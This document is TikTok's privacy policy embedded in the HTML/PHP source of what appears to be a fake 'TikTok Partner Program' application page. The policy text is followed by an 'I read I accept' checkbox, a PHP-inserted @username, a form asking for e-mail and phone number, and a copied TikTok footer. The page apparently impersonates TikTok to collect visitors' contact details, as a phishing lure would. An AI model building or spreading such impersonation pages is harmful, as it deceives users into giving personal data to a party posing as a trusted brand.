We are committed to protecting and respecting your privacy.  This policy explains our practices concerning the personal data we collect from you, or that you provide to us. If you do not agree with this policy, you should not use the Platform. 

If you have any questions about how we use your personal data, contact us at: https://www.tiktok.com/legal/report/privacy.

SUMMARY
What information do we collect about you?
We collect and process information you give us when you create an account and upload content to the Platform. This includes technical and behavioural information about your use of the Platform.  We also collect information about you if you download the app and interact with the Platform without creating an account.

How will we use the information about you?
We use your information to provide the Platform to you and to improve and administer it.  We use your information to, among other things, show you suggestions in the ‘For You’ feed, improve and develop the Platform and ensure your safety.  Where appropriate, we will also use your personal information to serve you targeted advertising and promote the Platform.

Who do we share your information with?
We share your data with third party service providers who help us to deliver the Platform, such as cloud storage providers. We also share your information with business partners, other companies in the same group as TikTok, content moderation services, measurement providers, advertisers, and analytics providers. Where and when required by law, we will share your information with law enforcement agencies or regulators, and with third parties pursuant to a legally binding court order.

How long do we keep hold of your information?
We retain your information for as long as it is necessary to provide you with the service. Where we do not need your information in order to provide the service to you, we retain it only as long as we have a legitimate business purpose in keeping such data or where we are subject to a legal obligation to retain the data. We will also retain your data if we believe it is or will be necessary for the establishment, exercise or defence of legal claims. 

How will we notify you of any changes to this Privacy Policy?
We will generally notify all users of any material changes to this policy through a notice on our Platform. However, you should look at this policy regularly to check for any changes. We will also update the “Last Updated” date at the top of this policy, which reflects the effective date of such policy. By accessing or using the Platform, you acknowledge that you have read this policy and that you understand your rights in relation to your personal data and how we will collect, use and process it.

***********************************************************************************************

1. The types of personal data we use
We collect and use the following information about you:

Your Profile Information. You give us information when you register on the Platform, including your username, date of birth (where applicable), email address and/or telephone number, information you disclose in your user profile, and your photograph or profile video. 

User Content and Behavioural Information. We process the content you generate and view on the Platform, including preferences you set (such as choice of language), photographs, audios and videos you upload, comments and live-streams you make (“User Content”). In order to improve the upload speed of User Content before clicking “Post” to confirm the upload, we will provide a preload service to upload audio and video in advance. If you cancel or fail to upload the content for other reasons, we will delete the associated audio and video from our server. We collect information through surveys, challenges and competitions in which you participate. We also collect information regarding your use of the Platform, e.g., how you engage with the Platform, including how you interact with content we show to you, the ads you view, videos you watch and problems encountered, the content you like, the content you save to ‘My Favourites’ and the users you follow.  We also infer your preferences, including your interests, gender and age for the purpose of personalising content. We process information about your followers, the likes you receive and responses to content you upload, for the purposes of promoting your content to other users and exploring whether your profile presents further opportunities for collaboration. Where appropriate, we will also use this information for the purpose of serving personalised advertising and to tell you about new services and opportunities. 

Information from Third Parties. You may choose to share certain data with us from third parties or through your use of the Platform, we may collect such third party data automatically. We have set out further detail on the information we receive from third parties below:

Business Partners

If you choose to register to use the Platform using your social network account details (e.g., Facebook, Twitter, Instagram, Google), you will provide us or allow your social network to provide us with your username and public profile. We will likewise share certain information with your social network such as your app ID, access token and the referring URL. For further information on sharing your Facebook contact list with us, please see Find other users and invite your friends.

Advertisers and Advertising Networks

We use the information collected from you, and your interaction with the Platform and other third party sites, to infer your likely interests to provide you with more relevant advertising. This information tells us about websites you've visited, apps you've downloaded and purchases you have made so that we can predict what else might interest you in the future and assess how effective the advertising on our Platform is. We collect this information by the use of Cookies and similar technologies on our App and from similar information received from third parties who advertise on our Platform and whose sites you visit.

Technical Information we collect about you. We automatically collect certain information from you when you use the Platform including when you are using the App without an account. Such information includes your IP address, browsing history (i.e. the content you have viewed on the Platform), mobile carrier, time zone settings, identifier for advertising purposes and the version of the app you are using. We will also collect information regarding the device you are using to access the Platform such as the model of your device, the device system, network type, device ID, your screen resolution and operating system. Where you log-in from multiple devices, we will be able to use your profile information to identify your activity across devices. 

Location. We use the 'Region' you select in Settings to customise your TikTok experience except where we provide location-based services, in which case we collect GPS (where we have your consent). 

Find other users and invite your friends. You can choose whether to find other users of the Platform using our 'Find Friends' function. This functionality allows you to see which of your friends from either your telephone's contact list or Facebook friends list is using the Platform and offers you the option to follow them. You can also use this function to invite your contacts to join you on the Platform. We will use the contact information you have for that person, either from within your telephone's contact list or Facebook friends list and give you the option to send them either an SMS, email or third party message (such as Whatsapp, Facebook (including Facebook Messenger) or Twitter) inviting them to view your TikTok profile.  

Buy coins. If you reside in certain jurisdictions that offer in-app coin purchases, please note the provisions of our Virtual Items Policy. Your purchase will be made via your Apple iTunes or Google Play account. We do not collect any financial or billing information from you in relation to such a transaction. Please review the relevant app store's terms and notices in respect of the handling of such data. So that we can credit your account with the correct value in coins, we keep a record of the purchases you make, the time at which you make those purchases and the amount spent.

2. Cookies
We and our vendors and service providers use cookies and other similar technologies (e.g., web beacons, flash cookies, etc.) (“Cookies”) to automatically collect information, measure and analyze which web pages you click on and how you use the Platform, enhance your experience using the Platform, improve our services, and provide you with targeted advertising on the Platform and elsewhere across your different devices. Cookies are small files which, when placed on your device, enable the Platform to provide certain features and functionality. Web beacons are very small images or small pieces of data embedded in images, also known as “pixel tags” or “clear GIFs,” that can recognize Cookies, the time and date a page is viewed, a description of the page where the pixel tag is placed, and similar information from your computer or device. By using the Platform, you consent to our use of Cookies.

Additionally, we allow our business partners, advertising networks, and other advertising vendors and service providers (including analytics vendors and service providers) to collect information about your online activities through Cookies. We link your contact or subscriber information with your activity on our Platform across all your devices, using your email or other log-in or device information. These third parties may use this information to display advertisements on our Platform and elsewhere online tailored to your interests, preferences, and characteristics. We are not responsible for the privacy practices of these third parties, and the information practices of these third parties are not covered by this Privacy Policy.

You may be able to refuse or disable Cookies by adjusting your browser settings. Because each browser is different, please consult the instructions provided by your browser. Please note that you may need to take additional steps to refuse or disable certain types of Cookies. For example, due to differences in how browsers and mobile apps function, you may need to take different steps to opt out of Cookies used for targeted advertising in a browser and to opt out of targeted advertising for a mobile application, which you may control through your device settings or mobile app permissions. In addition, your opt-out selection is specific to the particular browser or device that you are using when you opt out, so you may need to opt-out separately for each of browser or device. If you choose to refuse, disable, or delete Cookies, some of the functionality of the Platform may no longer be available to you.

3. How we use your personal data
We will use the information we collect about you in the following ways:

notify you about changes to our service;
provide you with user support;
personalise the content you receive and provide you with tailored content that will be of interest to you;
enable you to share User Content and interact with other users;
enable our messenger service to function if you choose to use this function;
enable you to participate in the virtual items program; 
communicate with you; 
to help us detect and combat abuse, harmful activity, fraud, spam, and illegal activity on the Platform;
ensure your safety and security including reviewing user content, messages and associated metadata for breach of our Community Guidelines and other inappropriate content;
ensure content is presented in the most effective manner for you and your device;
improve, promote and develop the Platform and promote popular topics, hashtags and campaigns on the Platform;
carry out data analysis and test the Platform to ensure its stability and security;
allow you to participate in interactive features of the Platform;
to enable you to socialise on the Platform, for example, by allowing other users to identify you via the "Find other friends" function or through their phone contacts; 
to ensure that you are old enough to use our Platform (as required by law).
provide you with personalised advertising;
provide you with location-based services (where those services are available in your jurisdiction);
enforce our terms, conditions and policies; and
administer the Platform including troubleshooting.
4. How we share your personal data
We share your data with the following selected third parties:

Business Partners

If you choose to register to use the Platform using your social network account details (e.g., Facebook, Twitter, Instagram, Google), you will provide us or allow your social network to provide us with your username and public profile. We will likewise share certain information with the relevant social network such as your app ID, access token and the referring URL.   

Where you opt to share content on social media platforms, the video, username and accompanying text will be shared on that platform or, in the case of sharing via instant messaging platforms such as Whatsapp, a link to the content will be shared. 

Payment Providers

If you choose to Buy Coins, we will share data with the relevant payment provider to facilitate this transaction. We share a transaction ID to enable us to identify you and credit your account with the correct value in coins once you have made the payment.

Service Providers 

We provide information and content to service providers who support our business, such as cloud service providers and providers of content moderation services to ensure that the Platform is a safe and enjoyable place. 

Analytics providers 

We use analytics providers to help us in the optimisation and improvement of the Platform.  Our third party analytics providers also help us serve targeted adverts

Advertisers and Advertising Networks

We share information with advertisers and third party measurement companies to show how many and which users of the Platform have viewed or clicked on an advertisement. We share your device ID with measurement companies so that we can link your activity on the Platform with your activity on other websites; we then use this information to show you adverts which may be of interest to you. 

Our Corporate Group

We may also share your information with other members, subsidiaries, or affiliates of our corporate group, to provide the Platform including improving and optimising the Platform, preventing illegal use and supporting users.

Law Enforcement

We will share your information with law enforcement agencies, public authorities or other organisations if legally required to do so, or if such use is reasonably necessary to:

comply with legal obligation, process or request;
enforce our Terms of Service and other agreements, policies, and standards, including investigation of any potential violation thereof;
detect, prevent or otherwise address security, fraud or technical issues; or
protect the rights, property or safety of us, our users, a third party or the public as required or permitted by law (including exchanging information with other companies and organisations for the purposes of fraud protection and credit risk reduction).
Public Profiles

Please note that if your profile is public, your content will be visible to anyone on the Platform and may also be accessed or shared by your friends and followers as well as third parties such as search engines, content aggregators and news sites. You can change who can see a video each time you upload a video. Alternatively, you can change your profile to default private by changing your settings to 'Private Account' in “Manage my account” settings. 

Sale or Merger

We will also disclose your information to third parties:

in the event that we sell or buy any business or assets (whether a result of liquidation, bankruptcy or otherwise), in which case we will disclose your data to the prospective seller or buyer of such business or assets; or
if we sell, buy, merge, are acquired by, or partner with other companies or businesses, or sell some or all of our assets. In such transactions, user information may be among the transferred assets.
5. Where we store your personal data 
The personal data we collect from you may be stored on a server located in Singapore or the United States, outside of the country where you live. We maintain major servers around the world to bring you our services globally and continuously. 

6. Your Choices
You can access and edit most of your profile information by signing into TikTok. You can delete the User Content you uploaded. We also provide a number of tools in Settings that allow you to control, among others, who can view your videos, send you messages, or post comments to your videos. Should you choose to do so, you may delete your entire account in Settings. If you have any questions on how to use those tools, or want to know about any rights you may have in the country where you live, please contact us at: https://www.tiktok.com/legal/report/privacy. 

7. The security of your personal data
We take steps to ensure that your information is treated securely and in accordance with this policy. Unfortunately, the transmission of information via the internet is not completely secure. Although we will protect your personal data, for example, by encryption, we cannot guarantee the security of your information transmitted via the Platform; any transmission is at your own risk.

We have appropriate technical and organizational measures to ensure a level of security appropriate to the risk of varying likelihood and severity for the rights and freedoms of you and other users. We maintain these technical and organizational measures and will amend them from time to time to improve the overall security of our systems.

We will, from time to time, include links to and from the websites of our partner networks, advertisers and affiliates. If you follow a link to any of these websites, please note that these websites have their own privacy policies and that we do not accept any responsibility or liability for these policies. Please check these policies before you submit any information to these websites.

8. How long we keep your personal data
We retain your information for as long as it is necessary to provide you with the service. Where we do not need your information in order to provide the service to you, we retain it only for so long as we have a legitimate business purpose in keeping such data. However, there are occasions where we are likely to keep this data for longer in accordance with our legal obligations or where it is necessary for the establishment, exercise or defence of legal claims. 

After you have terminated your use of our Platform, we store your information in an aggregated and anonymised format.

9. Information relating to children
TikTok is not directed at children under the age of 13. In certain cases this age may be higher due to local regulatory requirements, please see your local privacy policy for more information. If you believe that we have personal data about or collected from a child under the relevant age, contact us at: https://www.tiktok.com/legal/report/privacy.

10. Complaints
In the event that you wish to make a complaint about how we process your personal data, contact us immediately at: https://www.tiktok.com/legal/report/privacy. We will endeavour to deal with your request as soon as possible. This is without prejudice to your right to launch a claim with the relevant data protection authority.

11. Changes
We will generally notify all users of any material changes to this policy, through a notice provided via the Platform. However, you should look at this policy regularly to check for any changes. We will also update the “Last Updated” date at the top of this policy, which reflects the effective date of such policy. Your continued access to or use of the Platform after the date of the updated policy constitutes your acceptance of the updated policy. If you do not agree to the updated policy, you must stop accessing or using the Platform.

12. Contact
If you have questions, comments, or requests regarding this policy, contact us at: https://www.tiktok.com/legal/report/privacy.

Supplemental Terms – Jurisdiction-Specific
In the event of a conflict between the provisions of the Supplemental Terms – Jurisdiction-Specific that are relevant to your jurisdiction from which you access or use the Services, and the rest of policy, the relevant jurisdictions’ Supplemental Terms – Jurisdiction-Specific will supersede and control.

Russia. By using the Platform, you consent to the processing of personal data in accordance with this Privacy Policy.

Where we store your personal data. The personal data we collect from you may be stored on a server located in Singapore, outside of the country where you live.

India. If you are using our services in India, the Platform is provided and controlled by Bytedance (India) Technology Private Limited. TikTok is our brand for providing and promoting the services. When using these services from India, please accordingly read “TikTok”, “we” or “us” in this policy to refer to Bytedance (India) Technology India Private Limited.   

Indonesia. If you are using our services in Indonesia, the following additional terms apply. In the event of any conflict between the following additional terms and the provisions of the main body of this policy, the following terms shall apply. 

Age, Parental and Guardian Consent. By accessing and/or using this Platform, you represent that you are at least 21 years of age or married or not under guardianship. If you are below 21 years old and you are not married, or under guardianship:

you must obtain approval from your parent(s) or legal guardian(s); and
your parent(s) or legal guardian(s) are responsible for: (i) all your actions in connection with your access to and use of the Platform; (ii) your compliance with this policy; and (iv) ensuring that any of your participation in the Platform will not, in any event, result in any violation of applicable laws and regulations relating to child protections. 
If you do not have consent from your parent(s) or legal guardian(s) and your parent(s) or guardian(s) is not willing to open the account under their name, you must cease accessing the Platform.

Your Choices. You may withdraw your consent to TikTok's disclosure of personal data to third parties. Upon your request, we will ease to display, publish, transmit, disseminate, and/or open the access to your personal data to third parties. Please note that by withdrawing your consent to the disclosure and/or collection of your personal data, we may not be able to fulfill your requests and you may not be able to use some of TikTok features and functionality.

You may request TikTok to (i) disclose history of personal data that we have collected; and/or (ii) erase and dispose your personal data that we have collected on our server. Please note that by requesting us to erase and dispose your personal data, you may not be able to use some of TikTok features and functionality.

To exercise any of your rights, contact us at: https://www.tiktok.com/legal/report/privacy.

Notification. In the event of any breach of personal data, we will notify you and provide you with information regarding such breach of personal data.

Data retention. We retain your information for as long as it is necessary to provide you with the service. Where we do not need your information in order to provide the service to you, we retain it only for so long as we have a legitimate business purpose in keeping such data. However, there are occasions where we are likely to keep this data for five (5) years (or longer if required) in accordance with our legal obligations or where it is necessary for the establishment, exercise or defence of legal claims. 

After you have terminated your use of our Platform and the five (5) years retention period has lapsed, we store your information in an aggregated and anonymised format. Non-personally identifiable information may be retained indefinitely for analytics.

Philippines. If you are using our services in Philippines, the following additional terms shall apply pursuant to the relevant laws, rules and regulations and issuances by the Philippines National Privacy Commission (“NPC”) on data privacy.

Your Rights. To the extent that the relevant laws, rules and regulations on data privacy recognize your rights and freedoms as data subjects, you shall have the right to information, object, access, rectification, erasure or blocking, lodge complaints before the NPC, damages and data portability. Before we can respond to a request to exercise one or more of the rights listed above, you may be required to verify your identity or your account details.

Last Updated: This Supplementary Terms of this Policy was last updated on February 21, 2020 and is effective on the same date.

Turkey. If you are using our services in Turkey, the following additional terms apply along with the contents of the foregoing Policy. In the event of any conflict between the following additional terms and the provisions of the main body of this policy, the following terms shall prevail.

Data Controller Representative. You may contact our data controller representative in Turkey by email or mail to handle questions and complaints in connection with the processing of your personal data if you are in Turkey.

İlay Yılmaz

ilay.yilmaz@esin.av.tr

Ebulula Mardin Cad., Gül Sok. No. 2 

Maya Park Tower 2, Akatlar-Beşiktaş 34335 Istanbul Turkey

Legal bases for the processing your personal data. TikTok relies on the following legal bases while processing your personal data in accordance with Article 5 of the Law No. 6698 on Protection of Personal Data:

processing is explicitly laid down or dictated by laws
processing of your personal data is necessary provided that it is directly related to the conclusion or fulfilment of the contract between us
processing is mandatory for us to be able to comply with our legal obligations
the relevant data is made available to the public by yourself
processing is mandatory for the establishment, exercise or protection of a right
processing is mandatory for our legitimate interests, provided that it does not violate your fundamental rights and freedoms
your explicit consent (Please note that we rely on this legal basis only when we require your consent for the processing and we do not rely on this legal basis if and when we rely on one of the other legal grounds above)
Your rights. According to Article 11 of the Data Protection Law, you have the following rights with respect to your personal data:

the right to learn whether we process your personal data,
the right to request information with regard to such processing, if we process your personal data,
the right to learn the purposes of the processing and whether they are used for such purpose or not;
the right to know the third parties within or outside the country, to whom we transfer your personal data,
the right to request correction of incomplete or inaccurate personal data,
the right to request deletion or destruction of your personal data under the conditions set forth in Article 7 of the Data Protection Law,
the right to request that we notify the third parties, to whom we transferred your personal data, about the correction, deletion and/or destruction of your personal data per your request within the scope of the foregoing two items,
the right to object to the negative results about you that are due to the analysis of your personal data processed solely by automated means,
the right to claim indemnification for damages incurred due to illegal processing of your personal data.
You may exercise your rights listed above by contact us at: https://www.tiktok.com/legal/report/privacy.

The requests found in your application will be resolved as soon as possible according to the nature of your request and within thirty days at the latest free of charge. However, if your request incurs additional cost to our company, then you may be charged over the tariff fee determined by the Turkish Personal Data Protection Board.

Amendments. The following sections of the Policy do not apply to individuals in Turkey:

The following sentence at the end of the second paragraph of the introduction section: If you do not agree with this policy, please do not use this Platform.

The following sentence at the end of the Summary section: By accessing or using the Platform, you acknowledge that you have read this policy and that you understand your rights in relation to your personal data and how we will collect and process it. 

The following sentence at the end of the first paragraph of the Cookies section: By using the Platform, you consent to our use of Cookies.

Language. This policy is available in English and Turkish. If there is any inconsistency or different interpretation between the English and Turkish versions, the Turkish text shall prevail.

Vietnam. If you are using our services in Vietnam, the following additional terms apply. In the event of any conflict between the following additional terms and the provisions of the main body of this policy, the following terms shall prevail.

Age, Parental and Guardian Consent. By accessing and/or using this Platform, you represent that you are at least 16 years of age or not under guardianship. If you are below 16 years old or under guardianship:

you must obtain approval from your parent(s) or legal guardian(s); and
your parent(s) or legal guardian(s) are responsible for: (i) all your actions in connection with your access to and use of the Platform; (ii) your compliance with this policy; and (iii) ensuring that any of your participation in the Platform will not, in any event, result in any violation of applicable laws and regulations relating to child protections.
If you do not have consent from your parent(s) or legal guardian(s) and your parent(s) or legal guardian(s) is not willing to open the account under their name, you must cease accessing the Platform.

Thailand. If you are using our services in Thailand, the following additional terms apply. In the event of any conflict between the following additional terms and the provisions of the main body of this policy, the following terms shall prevail.

Age, Parental and Guardian Consent. By accessing and/or using this Platform, you represent that you are at least 20 years of age and/or legally competent under the applicable laws. If you are below 20 years old and/or not legally competent under the applicable laws:

you must obtain approval from your parent(s) or legal guardian(s); and
your parent(s) or legal guardian(s) are responsible for: (i) all your actions in connection with your access to and use of the Platform; (ii) your compliance with this policy; and (iii) ensuring that any of your participation in the Platform will not, in any event, result in any violation of applicable laws and regulations relating to child protections. 
If you do not have consent from your parent(s) or legal guardian(s) and your parent(s) or legal guardian(s) is not willing to open the account under their name, you must immediately cease accessing the Platform.

United Arab Emirates. If you are using the Platform in the United Arab Emirates (“UAE”), the following additional terms apply. If any conflict arises between the main Privacy Policy and the additional terms, the following terms shall prevail: 

1. How we share your personal data

In addition to the main text of this policy, by using the Platform in the UAE you agree to the terms of this Privacy Policy and consent to our sharing of your personal data in line with the main text of this Privacy Policy. 

2. Governing law and dispute resolution

By using our Platform in the UAE, this Privacy Policy will be governed by and interpreted in accordance with the laws of the UAE. In the event of a dispute arising between the parties in connection with this Privacy Policy:

where the dispute relates to a claim for a sum within the limits specified by the DIFC Small Claims Tribunal from time to time, then the dispute shall be referred by either party to the said Tribunal; and
for all other disputes, the parties shall seek settlement of that dispute by mediation in accordance with the Mediation Rules of the DIFC-LCIA Arbitration Centre, which Rules are deemed to be incorporated by reference to this clause. If the dispute is not settled by mediation within 30 days of the commencement of the mediation, or such further period as the parties shall agree in writing, the dispute shall be referred to and finally resolved by arbitration under the Arbitration Rules of the DIFC-LCIA Arbitration Centre, which Rules are deemed to be incorporated by reference to this clause. The language to be used in the mediation and in the arbitration, shall be English. In any arbitration commenced pursuant to this clause the number of arbitrators shall be one and the arbitration shall be conducted in Dubai.
Israel. If you are using our services in Israel, the following additional terms apply.

You declare that you are over the age of 18. If you are under the age of 18, please have your parent or legal guardian read this with you. If you are reviewing these terms as the parent/legal guardian of a user who is under the age of 18, you hereby declare that such user is above the age of 13 and that you have read and acknowledged TikTok's Privacy Policy and Terms of Use and agree to the use by your child of  the Platform and registration for an account.
South Korea. If you are using our services in South Korea, the following additional terms apply. In the event of any conflict between the following additional terms and the provisions of the main body of this policy, the following terms shall prevail.

Entrustment and/or Overseas Transfer of Personal Data. We entrust your data to our affiliates, cloud storage providers, IT service providers, and data centers, some of whom are located abroad (See the Korean language Privacy Policy), subject to your consents or notifications to you, if applicable. The entities receiving and processing your data are committed to using and storing personal data in compliance with domestic and international regulations and to taking all available physical and technical measures to protect personal data. You may opt-out of such transfer so long as the transfer is not necessary to provide you with the Service, by contacting us here.
 Local representative pursuant to the Personal Information Protection Act 
Please send your inquiries concerning privacy issues in South Korea to our local representative pursuant to the Personal Information Protection Act. Contact details are as follows. 
Bae, Kim and Lee LLC 
Representative: Yangho Oh
Address: Tower B, Centropolis, 26 Ujeongguk-ro
Jongno-gu, Seoul 03161, Korea
Phone: +82-2-3404-0108
Email: privacytiktok@bkl.co.kr
Brazil. If you are using the Platform in Brazil, the following additional terms apply. If any conflict arises between the main Privacy Policy and the additional terms, the following terms shall prevail: 

Parental and Guardian Consent. If required by Brazilian data protection laws, (i) if you are over the age of 16 but under the age of 18, you can only use and register for an account with the assistance of your parent or legal guardian and you declare and represent that you had such assistance to use the Services and to agree to the Policy; (ii) if you are over the age of 13 but under the age of 16, you can only use and register for an account with the representation of your parent or legal guardian, and you must obtain the consent from your parent or legal guardian to the use of the Services and acceptance of this Privacy Policy.

Exercise of data protection rights. Brazilian law provides certain rights to individuals with regard to their personal data. Thus, we seek to ensure transparency and access controls in order to allow users to benefit from the mentioned rights. 
We will respond and/or fulfill your requests for the exercise of your rights below, according to the applicable law and when applicable, to the Brazilian General Data Protection Law - LGPD, once it comes into force:
I. confirmation of whether your data are being processed;
II. access to your data;
III. correction of incomplete, inaccurate or outdated data;
IV. anonymization, blocking or erasure of data;
V. portability of personal data to a third party;
VI. object to the processing of personal data;
VII. information of public and private entities with which we shared data;
VIII. information about the possibility to refuse providing personal data and the respective consequences, when applicable;
IX. withdrawal of your consent. 

Verifying your identity: For your safety and to allow us to make sure that we do not disclose any of your personal data to unauthorized third parties, in order to verify your identity and guarantee the adequate exercise of your rights, we may request specific information and/or documents from you before we can properly respond to a request received concerning your data. All data and documents received from you in the process of responding to your requests will be used for the strict purposes of analyzing your request, authenticating your identity, and finally responding to your request.

Limitations to your rights: In certain situations, we may have legitimate reasons not to comply with some of your requests. For instance, we may choose not to disclose certain information to you when a disclosure could adversely impact our business whenever there is a risk of violation to our trade secrets or intellectual property rights. In addition, we may refrain from complying with a request for erasure when the maintenance of your data is required for complying with legal or regulatory obligations or when such maintenance is required to protect our rights and interests in case a dispute arises. Whenever this is the case and we are unable to comply with a request you make, we will let you know the reasons why we cannot fulfill your request.
Contact: In case of doubt about your privacy, your rights or how to exercise them, please contact us through the form "Contact". If you have any questions about the processing of your personal data, we would like to clarify them.

DPO: If you wish to reach the TikTok’s Data Protection Officer, contact us at: dpobrasil@tiktok.com

Access Logs. We keep your application access logs, under confidentiality, in a controlled and safe environment, for, at least, 6 months, in order to comply with legal obligations.

Language. The Policy may have been prepared in the English language and in the Portuguese language. If you are a user located in Brazil, you shall refer to the Portuguese version, which shall prevail.</textarea> <br>


</td>

      </tr>
      <tr>
        <td>
          <input type="checkbox" id="1" name="1" value="1"><label >I read I accept</label>
        </td>
      </tr>
      <tr>
         
         <td colspan="2"><p class="baslik2"><b>What is TikTok Partner?</b></p></td>
         
      </tr>
      <tr>
        <td>
          <p>Are you helping marketers solve complex challenges through technology or services? You may be a good fit for the TikTok Marketing Partner Program. Below you'll find more information about TikTok Partner specialties. If you meet the criteria for a specific specialty and are interested in becoming a partner then Apply Now.</p>
        </td>

      </tr>
            <tr>
        <td>
          <p class="baslik2" style="text-align: center;"><b>Application Form</b></p>
        </td>
      </tr>
       </tr>
            <tr>
        <td>
          <img src="logo.png" style="max-width: 120px;">
          <br>
         <label class="baslik2">@<?php echo "$username24"; ?></label>
        </td>
      </tr>
      <tr>
        <td ><form  method="post">

          <input type="mail" name="mail" placeholder="E-mail" class="user">
        </td>
      </tr>
            <tr>
              <td >
          <input type="number" name="number" placeholder="Phone number" class="user">
        </td>
      </tr>
            <tr>
        <td >
          <b><input class="buton" type="submit" name="bul" value="Apply!"></b>
        </td></form>
      </tr>
   </table>
  </div>

</body>
<footer style="background: black;">
  <div>
    <img src="logo.jpg" width="150px">
  <div style="margin-left:30%; display: block;">

    <table  style="width: 100%;">
            <tr>
        <td>
          <p class="baslik3" ><b>Company</b></p>
        </td>
        <td>
          <p class="baslik3" ><b>Programs</b></p>
        </td>
        <td>
          <p class="baslik3" ><b>Resources</b></p>
        </td>
        <td>
          <p class="baslik3" ><b>Legal</b></p>
        </td>

      </tr>
                  <tr>
        <td>
          <p class="baslik3" >About TikTok</p>
        </td>
        <td>
          <p class="baslik3" >TikTok for Good</p>
        </td>
        <td>
          <p class="baslik3" >Help Center</p>
        </td>
        <td>
          <p class="baslik3" >TikTok.com Cookies Policy</p>
        </td>

      </tr>
                  <tr>
        <td>
          <p class="baslik3" >Newsroom</p>
        </td>
        <td>
          <p class="baslik3" >TikTok for Developers</p>
        </td>
        <td>
          <p class="baslik3" >Safety Center</p>
        </td>
        <td>
          <p class="baslik3" >Intellectual Property Policy</p>
        </td>

      </tr>

                  <tr>
        <td>
          <p class="baslik3" >Contact</p>
        </td>
        <td>
          <p class="baslik3" >Advertise on TikTok</p>
        </td>
        <td>
          <p class="baslik3" >Creator Portal</p>
        </td>
        <td>
          <p class="baslik3" >Law Enforcement</p>
        </td>

      </tr>
                        <tr>
        <td>
          <p class="baslik3" >Careers</p>
        </td>
        <td>
          <p class="baslik3" ><b></b></p>
        </td>
        <td>
          <p class="baslik3" >Community Guidelines</p>
        </td>
        <td>
          <p class="baslik3" >Privacy Policy</p>
        </td>

      </tr>
                  <tr>
        <td>
          <p class="baslik3" >ByteDance</p>
        </td>
        <td>
          <p class="baslik3" ></p>
        </td>
        <td>
          <p class="baslik3" >Transparency</p>
        </td>
        <td>
          <p class="baslik3" >Terms of Service</p>
        </td>

      </tr>
</div>
</table>
</footer>

</html>